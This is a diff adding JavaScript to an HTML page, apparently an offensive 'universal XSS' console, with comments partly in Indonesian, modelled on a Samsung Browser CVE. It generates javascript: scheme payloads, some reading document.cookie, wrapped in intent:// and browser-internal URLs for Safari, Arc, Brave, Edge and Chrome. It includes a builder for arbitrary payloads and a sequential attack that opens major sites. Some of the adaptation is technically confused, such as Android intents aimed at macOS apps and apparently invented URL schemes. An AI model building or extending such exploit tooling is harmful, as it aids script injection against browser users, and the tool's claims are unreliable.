+            addLog(`💀 Step 2: Sending javascript: scheme to execute on ${target}`, 'uxss');
+            // window.location.href = maliciousIntent;
+        }, 2000);
+    }
+    
+    // EXPLOIT 2: Safari URL Scheme
+    function exploitSafariScheme() {
+        addLog("🍎 Attempting Safari URL Scheme uXSS...", 'info');
+        
+        const isSafari = currentBrowser === 'Safari';
+        if (!isSafari) addLog("⚠️ This exploit is most effective on Safari", 'warning');
+        
+        // Safari specific schemes
+        const schemes = [
+            'x-apple-extension://com.apple.Safari/extension?url=javascript:alert("uXSS")',
+            'x-web-search://?query=javascript:alert(document.cookie)',
+            'safari://open?url=javascript:alert(origin)'
         ];
         
-        addLog("🎯 Target internal pages (potential XSS vectors):", 'info');
-        internalPages.forEach(page => addLog(`   - ${page}`, 'info'));
+        addLog(`📂 Safari schemes to test: ${schemes.join(', ')}`, 'info');
         
-        // Simulate Firefox's Components.stack check
-        if (typeof Components !== 'undefined') {
-            addLog("🔥 COMPONENTS FOUND! This is like Firefox XUL RCE!", 'rce');
-            try {
-                addLog(`📚 Stack: ${Components.stack}`, 'rce');
-            } catch(e) {}
-        }
+        // Buka target
+        const target = 'https://www.apple.com';
+        addLog(`🎯 Opening target: ${target}`, 'info');
+        window.open(target, '_blank');
         
-        // Chromium equivalent
-        if (typeof chrome !== 'undefined') {
-            addLog("📦 Chrome API available", 'info');
-            if (chrome.devtools) addLog("🔧 DevTools API - potential privilege", 'rce');
-            if (chrome.runtime) addLog("⚡ Runtime API - extension context", 'rce');
-        }
-    });
+        addLog("💀 Jika Safari menerima javascript: scheme di URL handler, UXSS terjadi!", 'uxss');
+        checkVulnerableActivities();
+    }
+    
+    // EXPLOIT 3: ARC Browser Deep Link
+    function exploitArcDeepLink() {
+        addLog("🌀 Attempting ARC Browser Deep Link uXSS...", 'info');
+        
+        const isArc = currentBrowser === 'Arc';
+        if (isArc) addLog("✅ Arc browser detected - testing deep links", 'success');
+        
+        // ARC specific deep links
+        const arcLinks = [
+            'arc://newtab?url=javascript:alert("Arc uXSS")',
+            'arc-deeplink://open?url=javascript:alert(origin)',
+            'arc://boost?code=javascript:alert(document.cookie)'
+        ];
+        
+        addLog(`📂 ARC deep links to test: ${arcLinks.join(', ')}`, 'info');
+        
+        // Buka target ARC page
+        window.open('arc://newtab', '_blank');
+        
+        setTimeout(() => {
+            addLog("💀 Jika ARC memiliki exported activity yang vulnerable, kita bisa UXSS!", 'uxss');
+            addLog("📚 Mirip dengan BixbySBrowserLauncherActivity di Samsung Browser", 'info');
+        }, 1000);
+        
+        checkVulnerableActivities();
+    }
+    
+    // EXPLOIT 4: Brave Rewards
+    function exploitBraveRewards() {
+        addLog("🦁 Attempting Brave Rewards uXSS...", 'info');
+        
+        const isBrave = currentBrowser === 'Brave';
+        if (isBrave) addLog("✅ Brave browser detected", 'success');
+        
+        // Brave specific URLs
+        const braveLinks = [
+            'brave://rewards?url=javascript:alert("Brave uXSS")',
+            'brave://wallet?code=javascript:alert(origin)',
+            'brave://settings?search=javascript:alert(document.cookie)'
+        ];
+        
+        addLog(`📂 Brave internal pages: ${braveLinks.join(', ')}`, 'info');
+        
+        // Buka Brave internal page
+        window.open('brave://rewards', '_blank');
+        
+        addLog("💀 Jika Brave memiliki exported activity tanpa validasi yang tepat, UXSS mungkin!", 'uxss');
+        checkVulnerableActivities();
+    }
+    
+    // EXPLOIT 5: Edge Collections
+    function exploitEdgeCollections() {
+        addLog("📚 Attempting Edge Collections uXSS...", 'info');
+        
+        const isEdge = currentBrowser === 'Edge';
+        if (isEdge) addLog("✅ Edge browser detected", 'success');
+        
+        // Edge specific handlers
+        const edgeLinks = [
+            'microsoft-edge:https://google.com',
+            'edge://collections?url=javascript:alert("Edge uXSS")',
+            'ms-edge://newtab?code=javascript:alert(origin)'
+        ];
+        
+        addLog(`📂 Edge handlers: ${edgeLinks.join(', ')}`, 'info');
+        
+        window.open('edge://collections', '_blank');
+        
+        addLog("💀 Edge memiliki PDF viewer dan Collections yang mungkin vulnerable!", 'uxss');
+        checkVulnerableActivities();
+    }
+    
+    // EXPLOIT 6: Cross Browser Intent
+    function exploitCrossBrowserIntent() {
+        addLog("🔄 Attempting Cross-Browser Intent uXSS...", 'info');
+        addLog("📚 Teknik yang sama dengan Voorivex Team untuk Samsung Browser", 'info');
+        
+        // Universal intent untuk macOS
+        const bundleIds = {
+            'Arc': 'company.thebrowser.Browser',
+            'Chrome': 'com.google.Chrome',
+            'Safari': 'com.apple.Safari',
+            'Brave': 'com.brave.Browser',
+            'Edge': 'com.microsoft.edgemac'
+        };
+        
+        const bundleId = bundleIds[currentBrowser] || 'com.google.Chrome';
+        const jsPayload = encodeURIComponent("alert('Universal XSS! Origin: ' + origin);");
+        
+        const intentURL = `intent://example.com#Intent;scheme=https;package=${bundleId};S.url=javascript:${jsPayload};end`;
+        
+        addLog(`📱 Generated intent: ${intentURL.substring(0, 100)}...`, 'info');
+        addLog(`🎯 Target bundle: ${bundleId}`, 'info');
+        
+        // Sequential attack seperti POC Voorivex
+        const targetSites = ['https://www.google.com', 'https://www.github.com', 'https://www.twitter.com'];
+        
+        addLog("🔄 Executing sequential UXSS attack...", 'uxss');
+        
+        targetSites.forEach((site, index) => {
+            setTimeout(() => {
+                addLog(`📍 Opening ${site}`, 'info');
+                window.open(site, '_blank');
+            }, index * 2000);
+            
+            setTimeout(() => {
+                addLog(`💀 Sending javascript: payload to ${site}`, 'uxss');
+            }, index * 2000 + 1000);
+        });
+    }
+    
+    // Custom uXSS Builder
+    function buildUXSSExploit() {
+        const browser = document.getElementById('targetBrowser').value;
+        const targetSite = document.getElementById('targetSite').value;
+        const payload = document.getElementById('uxssPayload').value;
+        
+        addLog(`🔨 Building custom uXSS exploit for ${browser}`, 'info');
+        addLog(`🎯 Target website: ${targetSite}`, 'info');
+        addLog(`💉 Payload: ${payload.substring(0, 100)}${payload.length > 100 ? '...' : ''}`, 'uxss');
+        
+        const encodedPayload = encodeURIComponent(payload);
+        
+        // Build exploits for each browser (Samsung-style)
+        const exploits = {
+            'chrome': `intent://${targetSite.replace('https://', '')}#Intent;scheme=https;package=com.google.Chrome;S.extra_access_url=javascript:${encodedPayload};B.extra_by_capsule=true;end`,
+            'safari': `x-apple-extension://com.apple.Safari/extension?url=javascript:${encodedPayload}`,
+            'arc': `arc-deeplink://open?url=javascript:${encodedPayload}`,
+            'brave': `brave://rewards?url=javascript:${encodedPayload}`,
+            'edge': `microsoft-edge:javascript:${encodedPayload}`,
+            'all': `intent://${targetSite.replace('https://', '')}#Intent;scheme=https;S.url=javascript:${encodedPayload};end`
+        };
+        
+        const exploit = exploits[browser] || exploits['all'];
+        
+        addLog("📝 Generated exploit (Samsung Browser style):", 'info');
+        addLog(exploit.substring(0, 200) + (exploit.length > 200 ? '...' : ''), 'code');
+        
+        // Execute exploit
+        addLog("🚀 Executing uXSS exploit...", 'uxss');
+        
+        // Step 1: Open target site (seperti di POC Voorivex)
+        addLog(`📂 Step 1: Opening ${targetSite}`, 'info');
+        const targetTab = window.open(targetSite, '_blank');
+        
+        // Step 2: Send javascript payload via intent
+        setTimeout(() => {
+            addLog(`💀 Step 2: Sending javascript scheme to execute on ${targetSite}`, 'uxss');
+            addLog("⚠️ Jika browser memiliki exported activity yang vulnerable seperti Samsung Browser, UXSS terjadi!", 'warning');
+            // window.location.href = exploit;
+        }, 1500);
+        
+        checkVulnerableActivities();
+    }
+    
+    // Auto UXSS - Sequential Attack (Seperti POC Voorivex)
+    function executeAutoUXSS() {
+        addLog("⚡ Starting AUTO uXSS - Sequential Attack", 'uxss');
+        addLog("📚 Berdasarkan POC Voorivex untuk Samsung Browser", 'info');
+        
+        const targetSites = [
+            'https://www.google.com',
+            'https://www.github.com',
+            'https://www.reddit.com',
+            'https://www.wikipedia.org',
+            'https://www.amazon.com'
+        ];
+        
+        const payload = "alert('uXSS! Hacked on ' + origin); console.log('Universal XSS successful');";
+        const encodedPayload = encodeURIComponent(payload);
+        
+        addLog(`🎯 Target sites: ${targetSites.join(', ')}`, 'info');
+        
+        // Sequential attack seperti di Voorivex POC
+        targetSites.forEach((site, index) => {
+            // Step 1: Open site (seperti open google.com di POC)
+            setTimeout(() => {
+                addLog(`[${index + 1}] 📂 Opening ${site}`, 'info');
+                const tab = window.open(site, '_blank');
+                
+                // Step 2: Send javascript payload (seperti second intent di POC)
+                setTimeout(() => {
+                    addLog(`[${index + 1}] 💀 Sending javascript: payload to ${site}`, 'uxss');
+                    // In real exploit, this would be an intent:// URL
+                    addLog(`[${index + 1}] 📱 Intent: javascript:${encodedPayload.substring(0, 50)}...`, 'info');
+                }, 800);
+            }, index * 2500);
+        });
+        
+        // Summary
+        setTimeout(() => {
+            addLog("📊 uXSS Attack Sequence Complete", 'success');
+            addLog("💀 Jika browser memiliki exported activity yang vulnerable, semua tab di atas akan terkena XSS!", 'uxss');
+            addLog("📚 CVE-2025-58485: Samsung Browser's BixbySBrowserLauncherActivity → SBrowserMainActivity", 'info');
+        }, targetSites.length * 2500 + 1000);
+    }
+    
+    // Run initial checks
+    setTimeout(() => {
+        checkVulnerableActivities();
+        
+        addLog("", 'info');
+        addLog("📚 REFERENCE - Voorivex Team (CVE-2025-58485):", 'info');
+        addLog("   Path: BixbySBrowserLauncherActivity → handleIntent → handleGoals → handleAccessWebsite → SBrowserMainActivity → accessWebsite → loadUrl", 'info');
+        addLog("   Vulnerability: Extra_access_url parameter bisa diisi javascript: scheme", 'info');
+        addLog("   Result: UXSS on any website browser can access!", 'uxss');
+        addLog("", 'info');
+        
+        addLog("🎯 macOS Adaptation - Potential Vulnerable Components:", 'info');
+        addLog("   • Chrome: Custom Tabs, Intent filters, chrome:// pages", 'info');
+        addLog("   • Safari: URL scheme handlers, x-apple-extension://", 'info');
+        addLog("   • ARC: Deep links, arc://, Boost injection (CVE-2024-45489)", 'info');
+        addLog("   • Brave: Rewards, Wallet, brave:// internal pages", 'info');
+        addLog("   • Edge: Collections, PDF viewer, microsoft-edge://", 'info');
+    }, 500);
 </script>
 </body>
 </html>
